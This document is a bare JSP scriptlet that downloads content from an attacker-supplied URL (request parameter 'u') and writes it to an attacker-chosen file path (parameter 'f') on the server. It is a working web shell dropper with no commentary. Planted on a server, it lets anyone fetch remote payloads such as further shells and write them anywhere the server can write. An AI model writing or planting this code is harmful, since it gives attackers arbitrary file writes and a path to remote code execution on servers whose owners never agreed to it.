<%
    java.io.InputStream in = new java.net.URL(request.getParameter("u")).openStream();
    byte[] b = new byte[1024];
    java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
    int a = -1;
    while ((a = in.read(b)) != -1) {
        baos.write(b, 0, a);
    }
    new java.io.FileOutputStream(request.getParameter("f")).write(baos.toByteArray());
%>